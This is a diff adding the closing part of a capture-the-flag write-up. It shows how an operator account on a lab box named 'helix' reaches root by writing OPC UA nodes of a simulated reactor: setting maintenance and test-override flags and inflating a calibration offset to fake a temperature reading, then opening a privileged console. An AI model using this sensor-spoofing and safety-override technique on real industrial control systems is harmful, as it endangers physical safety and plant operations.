@@ -369,3 +369,63 @@ This is something that could be done manually but would be incredibly slow. We c
 The `nodeOVERRIDE.py` is the real magic. The PDF guide said the maintenance window opens once temperature crosses `~X°C` without a safety trip, so this drives the reactor sim to exactly that state — it puts the box in maintenance mode, then slowly inflates `CalibrationOffset` to push the displayed temperature up while watching that the raw value stays safe.
 
 It sets 2 other required variables to enable maintenance mode, then ramps `CalibrationOffset` by STEP every 30 seconds, reading all the key nodes each cycle.
+
+With all this information in hand we can `echo '' > FILENAME.py` and execute both scripts on our tunneled terminal and then open a separate terminal for executing the `helix-maint-console`.
+
+```
+operator@helix:~$ python3 async.py
+ns=2;i=1   Plant                (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+ns=2;i=2   Reactor              (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+ns=2;i=3   TemperatureRaw       value=281.675462186498          access=1
+ns=2;i=4   Temperature          value=281.675462186498          access=1
+ns=2;i=5   Pressure             value=68.86459039799928         access=1
+ns=2;i=6   CalibrationOffset    value=0.0                       access=3
+ns=2;i=7   Safety               (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+ns=2;i=8   RodsInserted         value=False                     access=3
+ns=2;i=9   EmergencyCooling     value=False                     access=3
+ns=2;i=10  TripActive           value=False                     access=1
+ns=2;i=11  Control              (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+ns=2;i=12  Mode                 value='NORMAL'                  access=3
+ns=2;i=13  TestOverride         value=False                     access=3
+ns=2;i=14  ResetTrip            value=False                     access=3
+operator@helix:~$ python3 nodeOVERRIDE.py
+Setting Mode = MAINTENANCE
+Setting TestOverride = True
+Starting offset ramp from 0.0
+offset=   0.0  Temp= 282.38  Raw= 282.38  Pressure= 68.90  Trip=False  Mode=MAINTENANCE
+offset=   2.0  Temp= 286.12  Raw= 284.12  Pressure= 69.23  Trip=False  Mode=MAINTENANCE
+offset=   4.0  Temp= 288.50  Raw= 284.50  Pressure= 69.33  Trip=False  Mode=MAINTENANCE
+offset=   6.0  Temp= 290.58  Raw= 284.58  Pressure= 69.36  Trip=False  Mode=MAINTENANCE
+offset=   8.0  Temp= 292.60  Raw= 284.60  Pressure= 69.37  Trip=False  Mode=MAINTENANCE
+offset=  10.0  Temp= 294.60  Raw= 284.60  Pressure= 69.37  Trip=False  Mode=MAINTENANCE
+^C
+Stopped at offset 12.0
+operator@helix:~$ python3 async.py
+ns=2;i=1   Plant                (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+ns=2;i=2   Reactor              (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+ns=2;i=3   TemperatureRaw       value=284.440744826935          access=1
+ns=2;i=4   Temperature          value=296.440744826935          access=1
+ns=2;i=5   Pressure             value=69.30860927780827         access=1
+ns=2;i=6   CalibrationOffset    value=12.0                      access=3
+ns=2;i=7   Safety               (object/method) The attribute is not supported for the specified Node.(BadAttributeIdInvalid)
+```
+
+After verifying acces privileges, writing new values to the variables required to enter maintenance mode, and then lastly double checking that each prerequiste is met - we can execute the shell file on the other SSH terminal to attempt root.
+
+```
+operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
+[+] Privileged maintenance access granted
+[!] Window expires in 107 seconds
+[!] Session will be terminated automatically
+root@helix:/home/operator# ls
+ async.py                      'Operator Control & Safety Guide.pdf'
+'control systems diagram.png'   user.txt
+ nodeOVERRIDE.py
+root@helix:/home/operator# cd /root
+root@helix:~# ls
+root.txt  snap
+root@helix:~# cat root.txt
+<ROOT_FLAG_HERE>
+root@helix:~# /usr/local/sbin/helix-maint-console: line 36:  2144 Killed                  systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes /bin/bash -p -i
+operator@helix:~$ 
+```
